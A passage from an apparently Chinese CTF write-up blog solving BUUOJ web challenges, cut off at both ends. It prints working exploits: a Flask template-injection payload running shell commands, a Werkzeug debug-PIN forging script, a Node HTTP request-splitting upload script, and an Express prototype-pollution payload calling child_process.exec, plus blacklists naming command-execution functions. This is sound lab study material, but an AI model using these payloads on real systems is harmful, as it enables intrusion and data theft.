class="line"></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        text = <span class="string">""</span></span><br><span class="line">        form = NameForm(text)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>,form = form ,method = <span class="string">"加密"</span> ,img = <span class="string">"flask.png"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/decode',methods=['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">'text'</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">"text"</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">"结果 ： &#123;0&#125;"</span>.format(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line">            flash(<span class="string">"no no no !!"</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'decode'</span>))</span><br><span class="line">        res =  render_template_string(tmp)</span><br><span class="line">        flash( res )</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'decode'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        text = <span class="string">""</span></span><br><span class="line">        form = NameForm1(text)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>,form = form, method = <span class="string">"解密"</span> , img = <span class="string">"flask1.png"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/&lt;name&gt;',methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">not_found</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"404.html"</span>,name = name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>可以看见黑名单</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">"flag"</span>,<span class="string">"os"</span>,<span class="string">"system"</span>,<span class="string">"popen"</span>,<span class="string">"import"</span>,<span class="string">"eval"</span>,<span class="string">"chr"</span>,<span class="string">"request"</span>,</span><br><span class="line">                  <span class="string">"subprocess"</span>,<span class="string">"commands"</span>,<span class="string">"socket"</span>,<span class="string">"hex"</span>,<span class="string">"base64"</span>,<span class="string">"*"</span>,<span class="string">"?"</span>]</span><br></pre></td></tr></table></figure>



<p>直接上Vulhub的payload修改一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">'ev'</span>+<span class="string">'al'</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">'eva'</span>+<span class="string">'l'</span>](<span class="string">'__imp'</span>+<span class="string">'ort__("o"+"s").pop'</span>+<span class="string">'en("id").read()'</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>查看目录  ls</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">app bin boot dev etc home lib lib64 media mnt opt proc requirements.txt root run sbin srv sys this_is_the_flag.txt tmp usr var</span><br></pre></td></tr></table></figure>

<p>查看flag   cat this_is_the_fl”+”ag.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;93df69f0-3005-414f-a119-c5562af1b167&#125;</span><br></pre></td></tr></table></figure>

<p>想通过计算PIN，但是获取所有信息后计算出来不一致。</p>
<h3 id="另一种解法"><a href="#另一种解法" class="headerlink" title="另一种解法"></a>另一种解法</h3><p>计算PIN <a href="https://xz.aliyun.com/t/2553" target="_blank" rel="noopener">参考链接</a></p>
<p>需要获取六个变量的值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">username <span class="comment"># 用户名</span></span><br><span class="line"></span><br><span class="line">modname <span class="comment"># flask.app</span></span><br><span class="line"></span><br><span class="line">getattr(app, <span class="string">'__name__'</span>, getattr(app.__class__, <span class="string">'__name__'</span>)) <span class="comment"># Flask</span></span><br><span class="line"></span><br><span class="line">getattr(mod, <span class="string">'__file__'</span>, <span class="literal">None</span>) <span class="comment"># flask目录下的一个app.py的绝对路径</span></span><br><span class="line"></span><br><span class="line">uuid.getnode() <span class="comment"># mac地址十进制  02:42:ae:00:cf:18-&gt;2485410385688</span></span><br><span class="line"></span><br><span class="line">get_machine_id() <span class="comment"># /etc/machine-id   这里是/proc/self/cgroup  </span></span><br><span class="line"><span class="number">12</span>:blkio:/docker/<span class="number">29747</span>fd95662eedc0f932bdacd32401f736d1ebff306b24046b30b43aa287b76</span><br></pre></td></tr></table></figure>

<p>计算脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">'flaskweb'</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">'flask.app'</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">'Flask'</span>,<span class="comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span></span><br><span class="line">    <span class="string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span> <span class="comment"># getattr(mod, '__file__', None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">'2485410385688'</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/eth0/address</span></span><br><span class="line">    <span class="string">'29747fd95662eedc0f932bdacd32401f736d1ebff306b24046b30b43aa287b76'</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b'cookiesalt'</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">'__wzd'</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b'pinsalt'</span>)</span><br><span class="line">    num = (<span class="string">'%09d'</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>

<p>拿到pin登录</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[console ready]&gt;&gt;&gt; <span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.popen(<span class="string">"ls /"</span>).read()</span><br><span class="line"><span class="string">'app\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\nthis_is_the_flag.txt\ntmp\nusr\nvar\n'</span>  </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.popen(<span class="string">"cat /this_is_the_flag.txt"</span>).read()</span><br><span class="line"><span class="string">'flag&#123;033e49d3-6201-41c6-9725-e95898cbc3d9&#125;\n'</span></span><br></pre></td></tr></table></figure>



<h1 id="node-game"><a href="#node-game" class="headerlink" title="node_game"></a>node_game</h1><p>经过查找资料，本题是改自于hackim-2020，<a href="http://blog.5am3.com/2020/02/11/ctf-node1/" target="_blank" rel="noopener">出题师傅博客</a></p>
<p><strong>题目提示 node 版本为8.12.0</strong></p>
<p>打开题目有两个选项</p>
<p><img src="/pic/117.png" alt=""></p>
<p>选择Only admin can use this</p>
<p>是一个文件上传的界面</p>
<p><img src="/pic/116.png" alt=""></p>
<p>选择Click here to get the source可以查看源码，总共有四条路由和一个黑名单函数</p>
<p>黑名单函数检测下列字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;global&quot;,&quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;root&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\&quot;&quot;,&quot;&#39;&quot;,&quot;!&quot;</span><br></pre></td></tr></table></figure>

<p>根路由是获取pug文件渲染后的页面</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> action = req.query.action?req.query.action:<span class="string">"index"</span>;</span><br><span class="line">    <span class="keyword">if</span>( action.includes(<span class="string">"/"</span>) || action.includes(<span class="string">"\\"</span>) )&#123;   <span class="comment">//action不能包含 ‘/’和‘\\’</span></span><br><span class="line">        res.send(<span class="string">"Errrrr, You have been Blocked"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file = path.join(__dirname + <span class="string">'/template/'</span>+ action +<span class="string">'.pug'</span>);</span><br><span class="line">    <span class="keyword">var</span> html = pug.renderFile(file);</span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>一条是显示源码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">'/source'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.sendFile(path.join(__dirname + <span class="string">'/template/source.txt'</span>));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>一条是上传文件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.post(<span class="string">'/file_upload'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ip = req.connection.remoteAddress;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;</span><br><span class="line">        msg: <span class="string">''</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ip.includes(<span class="string">'127.0.0.1'</span>)) &#123;   <span class="comment">//保证地址是127.0.0.1</span></span><br><span class="line">        obj.msg=<span class="string">"only admin's ip can use it"</span></span><br><span class="line">        res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    &#125;</span><br><span class="line">    fs.readFile(req.files[<span class="number">0</span>].path, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;   <span class="comment">//读取文件内容，读取的数据放到data中</span></span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            obj.msg = <span class="string">'upload failed'</span>;  </span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));   <span class="comment">//如果读取失败，返回upload failed</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> file_path = <span class="string">'/uploads/'</span> + req.files[<span class="number">0</span>].mimetype +<span class="string">"/"</span>;   <span class="comment">//file_path为 /uploads/ 加上上传时的Content-Type</span></span><br><span class="line">            <span class="keyword">var</span> file_name = req.files[<span class="number">0</span>].originalname   <span class="comment">//file_name为上传时的文件名</span></span><br><span class="line">            <span class="keyword">var</span> dir_file = __dirname + file_path + file_name</span><br><span class="line">            <span class="keyword">if</span>(!fs.existsSync(__dirname + file_path))&#123;  </span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fs.mkdirSync(__dirname + file_path)  <span class="comment">//检查路径是否存在，如果不存在就创建 </span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    obj.msg = <span class="string">"file type error"</span>;</span><br><span class="line">                    res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fs.writeFileSync(dir_file,data)  <span class="comment">//向上传的文件中写入数据</span></span><br><span class="line">                obj = &#123;</span><br><span class="line">                    msg: <span class="string">'upload success'</span>,</span><br><span class="line">                    filename: file_path + file_name</span><br><span class="line">                &#125; </span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                obj.msg = <span class="string">'upload failed'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>还有一条是代理访问<code>http://localhost:8081/source</code><br>这一条就刚好解决了文件上传的IP不是127.0.0.1的问题。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">'/core'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.query.q;  <span class="comment">//获取参数q</span></span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">'http://localhost:8081/source?'</span> + q  </span><br><span class="line">        <span class="built_in">console</span>.log(url)  <span class="comment">//终端打印url</span></span><br><span class="line">        <span class="keyword">var</span> trigger = blacklist(url);  </span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;   </span><br><span class="line">            res.send(<span class="string">"&lt;p&gt;error occurs!&lt;/p&gt;"</span>);   <span class="comment">//url中不能包含黑名单中字符，也就是参数q不能包含</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">                    resp.setEncoding(<span class="string">'utf8'</span>);</span><br><span class="line">                    resp.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;  <span class="comment">//处理response流中的error事件</span></span><br><span class="line">                    <span class="keyword">if</span> (err.code === <span class="string">"ECONNRESET"</span>) &#123;</span><br><span class="line">                     <span class="built_in">console</span>.log(<span class="string">"Timeout occurs"</span>);</span><br><span class="line">                     <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                   &#125;);</span><br><span class="line"></span><br><span class="line">                    resp.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>) </span>&#123;   <span class="comment">////处理response流中的data事件</span></span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                         resps = chunk.toString();</span><br><span class="line">                         res.send(resps);</span><br><span class="line">                        &#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                           res.send(e.message);</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">                    &#125;).on(<span class="string">'error'</span>, (e) =&gt; &#123;</span><br><span class="line">                         res.send(e.message);&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(<span class="string">"search param 'q' missing!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>题目提示了node版本，搜索发现  此版本的http.get存在漏洞<br><a href="https://xz.aliyun.com/t/2894#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/2894#toc-2</a></p>
<p>翻阅pug文档<a href="https://pugjs.bootcss.com/language/includes.html" target="_blank" rel="noopener">https://pugjs.bootcss.com/language/includes.html</a></p>
<p>包含flag文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">doctype html</span><br><span class="line">html</span><br><span class="line">  head</span><br><span class="line">    style</span><br><span class="line">      include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt</span><br></pre></td></tr></table></figure>

<p>使用文件上传路由，然后抓包，再修改一下</p>
<blockquote>
<p>尝试自己编写脚本，但是一直报错，待更新</p>
</blockquote>
<p>附上赵师傅的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''' HTTP/1.1</span></span><br><span class="line"><span class="string">Host: x</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=--------------------------919695033422425209299810</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string">cache-control: no-cache</span></span><br><span class="line"><span class="string">Host: x</span></span><br><span class="line"><span class="string">Content-Length: 292</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">----------------------------919695033422425209299810</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="glzjin.pug"</span></span><br><span class="line"><span class="string">Content-Type: /../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">doctype html</span></span><br><span class="line"><span class="string">html</span></span><br><span class="line"><span class="string">  head</span></span><br><span class="line"><span class="string">    style</span></span><br><span class="line"><span class="string">      include ../../../../../../../flag.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">----------------------------919695033422425209299810--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /flag HTTP/1.1</span></span><br><span class="line"><span class="string">Host: x</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">x:'''</span></span><br><span class="line">payload = payload.replace(<span class="string">"\n"</span>, <span class="string">"\r\n"</span>)</span><br><span class="line">payload = <span class="string">''</span>.join(chr(int(<span class="string">'0xff'</span> + hex(ord(c))[<span class="number">2</span>:].zfill(<span class="number">2</span>), <span class="number">16</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> payload)</span><br><span class="line">print(payload)</span><br><span class="line">r = requests.get(<span class="string">'http://3bfb563e-08fd-4430-80c9-4619b1f703e9.node3.buuoj.cn/core?q='</span> + urllib.parse.quote(payload))</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line">r = requests.get(url+<span class="string">'/?action=glzjin'</span>)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>













<h1 id="ezExpress"><a href="#ezExpress" class="headerlink" title="ezExpress"></a>ezExpress</h1><p>打开题目是一个登录界面</p>
<p><img src="/pic/127.png" alt=""></p>
<p>随意输入一下看看404有什么东西，得到了网页的绝对地址/app</p>
<p><img src="/pic/130.png" alt=""></p>
<p>扫描发现有源码<a href="http://www.zip,先查看route下的源码" target="_blank" rel="noopener">www.zip,先查看route下的源码</a></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;   <span class="comment">//不能包含admin</span></span><br><span class="line">  <span class="keyword">if</span>(keyword.match(<span class="regexp">/(admin)/i</span>s)) &#123;</span><br><span class="line">      <span class="keyword">return</span> keyword</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">'/login'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.body.Submit==<span class="string">"register"</span>)</span><br><span class="line">   <span class="keyword">if</span>(safeKeyword(req.body.userid))&#123;      <span class="comment">//调用safeKeyword函数进行过滤</span></span><br><span class="line">    res.end(<span class="string">"&lt;script&gt;alert('forbid word');history.go(-1);&lt;/script&gt;"</span>) </span><br><span class="line">   &#125;</span><br><span class="line">    req.session.user=&#123;   <span class="comment">//将用户名，密码写入session</span></span><br><span class="line">      <span class="string">'user'</span>:req.body.userid.toUpperCase(),   <span class="comment">//将输入转成大写</span></span><br><span class="line">      <span class="string">'passwd'</span>: req.body.pwd,</span><br><span class="line">      <span class="string">'isLogin'</span>:<span class="literal">false</span></span><br><span class="line">    &#125;&#123;</span><br><span class="line">    res.redirect(<span class="string">'/'</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.body.Submit==<span class="string">"login"</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.session.user)&#123;res.end(<span class="string">"&lt;script&gt;alert('register first');history.go(-1);&lt;/script&gt;"</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span>(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;</span><br><span class="line">      req.session.user.isLogin=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.end(<span class="string">"&lt;script&gt;alert('error passwd');history.go(-1);&lt;/script&gt;"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>觉得<code>toUpperCase</code>有点可疑，<a href="https://xz.aliyun.com/t/7184#toc-11" target="_blank" rel="noopener">查找资料</a>后发现</p>
<p>对于toUpperCase():</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;</span><br></pre></td></tr></table></figure>

<p>对于toLowerCase():</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K)</span><br></pre></td></tr></table></figure>

<p>使用adm<code>ı</code>n注册  </p>
<p>merge、clone 可能触发原型链污染（暂时没有弄懂为什么会造成原型链污染）<a href="https://xz.aliyun.com/t/7184#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/7184#toc-5</a></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.post(<span class="string">'/action'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.session.user.user!=<span class="string">"ADMIN"</span>)&#123;res.end(<span class="string">"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;"</span>)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(<span class="string">"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;"</span>);  </span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">'/info'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">'index'</span>,data=&#123;<span class="string">'user'</span>:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p><code>/action</code>代码对post传入的数据进行了clone操作,触发原型链污染。render造成代码执行<a href="[https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/](https://evi0s.com/2019/08/30/expresslodashejs-从原型链污染到rce/)">参考链接</a></p>
<p>传入可造成任意代码执行的数据，提示已经给出，flag在/flag文件中，由于无法显示出来，所以将内容输出到文件，路径已经从404报错页面得到，框架对外显示的路径都是/public/</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/action</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: f59a86b7-025d-4112-8179-5408079236b0.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Origin</span>: http://f59a86b7-025d-4112-8179-5408079236b0.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://f59a86b7-025d-4112-8179-5408079236b0.node3.buuoj.cn/</span><br><span class="line"><span class="attribute">Cookie</span>: session=s%3AG1zgVNFpJSA-czxyV6IyZ_mCJSStbn_6.Tw40woUQYqkMMTqBQl2SDs8Td0Og%2FepP2NS%2FT24zFK8</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Length</span>: 133</span><br><span class="line"></span><br><span class="line">&#123;"__proto__":&#123;"outputFunctionName": "a;global.process.mainModule.require('child_process').exec('cat /flag &gt; /app/public/a.txt');//"&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>访问/info触发代码执行</p>
<p><img src="/pic/129.png" alt=""></p>
<p>访问/a.txt得到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;6d73d1f0-0865-44c3-9851-4e6f38dd58be&#125;</span><br></pre></td></tr></table></figure>





<p>参考链接：<a href="https://www.zhaoj.in/read-6462.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6462.html</a></p>
]]></content>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录12-CISCN2019</title>
    <url>/2020/02/10/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%9512-CISCN2019/</url>
    <content><![CDATA[<h2 id="华北赛区-Day1-Web1-Dropbox"><a href="#华北赛区-Day1-Web1-Dropbox" class="headerlink" title="华北赛区 Day1 Web1 Dropbox"></a>华北赛区 Day1 Web1 Dropbox</h2><p>拿到题目是一个登入页面</p>
<p>注册，登入，上传文件</p>
<p>上传一个图片，上传成功。点击下载，下载时发现有任意文件下载漏洞</p>
<p>把文件下载下来进行代码审计</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;index.php</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#39;login&#39;])) &#123;</span><br><span class="line">    header(&quot;Location: login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1, shrink-to-fit&#x3D;no&quot;&gt;</span><br><span class="line">&lt;title&gt;网盘管理&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;static&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;static&#x2F;css&#x2F;panel.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;static&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;script 